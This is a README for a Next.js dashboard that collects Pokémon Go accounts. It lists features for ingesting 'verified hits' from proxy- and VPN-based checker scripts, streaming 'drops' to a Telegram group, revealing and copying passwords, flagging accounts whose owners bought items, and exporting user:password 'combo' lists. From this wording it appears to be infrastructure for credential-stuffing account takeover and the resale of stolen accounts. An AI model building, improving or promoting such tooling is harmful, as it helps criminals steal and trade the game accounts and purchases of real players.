# Pokémon Go Vault Dashboard

A high-performance, dark-mode, glassmorphic intelligence dashboard inspired by [beUI](https://beui.dev/). Built with Next.js (App Router), Tailwind CSS, Framer Motion, and MongoDB Atlas.

> **Design Rule:** Strictly minimal, professional, and zero emojis across all UI elements.

---

## Features

- **Strict Access Control & Whitelisting**:
  - Secure JWT authentication with HTTP-only cookies.
  - Whitelist gate: newly registered operators must be approved by an administrator before gaining access.
  - Master Passkey mode using your configured `ADMIN_INVITE_CODE`.
  - Admin modal to view users, grant/revoke access, or delete accounts.
- **Account Intelligence Cards**:
  - Masked passwords with 1-click reveal and 1-click Copy buttons (`Copy Combo`, `Copy User`, `Copy Pass`).
  - Color-coded badges for Level 50+, Level 40+, and Prior Spenders (webstore buyers).
  - Stats for PokéCoins, Stardust, Item Bag, Storage, Team, and extraction metadata.
- **Continuous Telegram Group Live Stream**:
  - Real-time Server-Sent Events (SSE) feed replicating a live Telegram channel/group chat.
  - Real-time audio notification chime on each new drop.
  - Instant hit synchronization directly from running checker scripts.
- **Multi-Filter & Instant Search**:
  - Full-text search by email, game email, country, or keyword.
  - Level tier chips (`All`, `Lvl 50+`, `Lvl 40+`, `Lvl 30+`, `Failed/Invalid`).
  - Spender status toggles (`Any`, `Prior Spenders Only`, `First-Time Buyers`).
  - Team filters (`All`, `Mystic`, `Valor`, `Instinct`, `Teamless`).
  - Sort by Newest, Highest Level, Most PokéCoins, or Most Stardust.
- **Data Ingestion**:
  - **Option A (Historical Import)**:
    - 1-Click sync from local JSON result archives directly into MongoDB Atlas.
    - Raw Telegram message parser to import chat history.
  - **Option B (Realtime Stream)**:
    - Checker scripts (`index-fast-proxy-tele.js`, `index-fast-vpn-tele.js`) automatically post verified hits asynchronously to `/api/accounts/push` authenticated with `CHECKER_API_KEY`.
- **Export Options**:
  - 1-click Export to CSV.
  - 1-click Export to Combo format (`user:password` TXT).

---

## Configuration (`dashboard/.env.local`)

Copy `.env.example` to `.env.local` and configure your credentials:

```bash
cp .env.example .env.local
```

```env
# MongoDB Atlas Connection
MONGODB_URI=mongodb+srv://<username>:<password>@cluster0.mongodb.net/?retryWrites=true&w=majority
MONGODB_DB=pokemon_extractor

# Authentication & Keys (generate strong keys: openssl rand -hex 32)
JWT_SECRET=your_super_secret_jwt_key_here
CHECKER_API_KEY=your_checker_sync_api_key_here
ADMIN_INVITE_CODE=your_admin_invite_code_here

# Telegram Integration
TELEGRAM_BOT_TOKEN=your_telegram_bot_token_here
TELEGRAM_CHAT_ID=-100xxxxxxxxxx
```

---

## Running the Application

From within `dashboard/`:
```bash
npm run dev
```

Visit [http://localhost:3000](http://localhost:3000) in your browser.

- Unlock with the `ADMIN_INVITE_CODE` configured in your `.env.local`.
